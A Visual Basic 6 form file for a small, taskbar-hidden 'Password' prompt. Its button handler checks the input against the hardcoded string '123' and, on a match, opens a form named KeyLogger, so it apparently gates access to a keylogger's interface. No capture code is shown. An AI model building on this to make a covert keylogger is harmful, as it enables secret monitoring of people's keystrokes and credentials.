VERSION 5.00
Begin VB.Form pass 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Password"
   ClientHeight    =   315
   ClientLeft      =   11580
   ClientTop       =   9690
   ClientWidth     =   1380
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   315
   ScaleWidth      =   1380
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command1 
      Caption         =   ">"
      Height          =   255
      Left            =   1080
      TabIndex        =   1
      Top             =   0
      Width           =   255
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   975
   End
End
Attribute VB_Name = "pass"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
    


    If Text1.Text = "123" Then
        
        KeyLogger.Show
        Unload Me
        
    Else
        Unload Me
    End If
End Sub

